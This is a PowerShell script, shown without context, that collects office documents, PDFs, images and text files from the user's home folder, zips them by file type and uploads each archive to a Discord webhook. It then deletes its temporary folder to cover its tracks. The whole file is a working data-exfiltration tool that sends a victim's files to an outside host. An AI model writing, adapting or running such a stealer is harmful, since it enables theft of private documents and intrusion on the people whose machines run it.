# Specify the target directory (user's home directory)
$targetDirectory = $env:UserProfile

# Specify the file extensions to target
$fileExtensions = "*.docx", "*.doc", "*.ppt", "*.pptx", "*.xls", "*.xlsx", "*.pdf", "*.jpeg", "*.png", "*.jpg", "*.csv", "*.txt"

# Function to create a zip file from a directory
function Zip-Directory {
    param (
        [Parameter(Mandatory=$true)]
        [string]$SourceDirectory,
        [Parameter(Mandatory=$true)]
        [string]$DestinationZipFile
    )

    Compress-Archive -Path $SourceDirectory -DestinationPath $DestinationZipFile -CompressionLevel Optimal
}

# Function to upload a file to Discord webhook
function Upload-To-Discord {
    param (
        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )

    $webhookPayload = @{
        files = @(
            [PSCustomObject]@{
                filename = Split-Path -Leaf $FilePath
                file = [System.IO.File]::ReadAllBytes($FilePath)
            }
        )
    }

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $webhookPayload -ContentType 'application/json'
}

# Create a temporary directory to store the organized files
$tempDirectory = Join-Path $env:TEMP 'file_transfer'
New-Item -ItemType Directory -Path $tempDirectory -Force

# Iterate through each file extension and process files
foreach ($extension in $fileExtensions) {
    # Create a directory for the file type
    $fileTypeDirectory = Join-Path $tempDirectory $extension.Substring(1)
    New-Item -ItemType Directory -Path $fileTypeDirectory -Force

    # Copy files with the specified extension to the directory
    Get-ChildItem $targetDirectory -Filter $extension | Copy-Item -Destination $fileTypeDirectory

    # Zip the directory
    $zipFilePath = Join-Path $tempDirectory "$($extension.Substring(1)).zip"
    Zip-Directory $fileTypeDirectory $zipFilePath

    # Upload the zip file to Discord
    Upload-To-Discord -WebhookUrl '$dc' -FilePath $zipFilePath
}

# Remove the temporary directory and its contents
Remove-Item $tempDirectory -Recurse -Force
